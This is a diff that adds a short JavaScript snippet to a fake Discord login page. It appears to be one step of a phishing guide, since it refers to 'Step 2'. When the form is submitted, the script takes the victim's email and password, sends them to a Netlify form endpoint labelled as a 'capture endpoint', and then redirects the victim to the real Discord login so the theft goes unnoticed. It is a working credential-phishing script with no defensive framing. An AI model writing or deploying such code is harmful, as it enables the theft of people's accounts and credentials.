@@ -1,0 +1,27 @@
+<script>
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const btn = document.getElementById('submit-btn');
+        
+        // Visual feedback
+        btn.textContent = "Logging in...";
+        btn.disabled = true;
+
+        // Send data to your capture endpoint (see Step 2)
+        fetch('https://api.netlify.com/forms/your-form-id-here', {
+            method: 'POST',
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: new URLSearchParams({ email: email, password: password })
+        }).then(() => {
+            // Redirect to REAL Discord after capturing
+            window.location.href = "https://discord.com/login";
+        }).catch(err => {
+            // Fallback if Netlify form fails
+            console.log("Captured:", email, password);
+            window.location.href = "https://discord.com/login";
+        });
+    });
+</script>
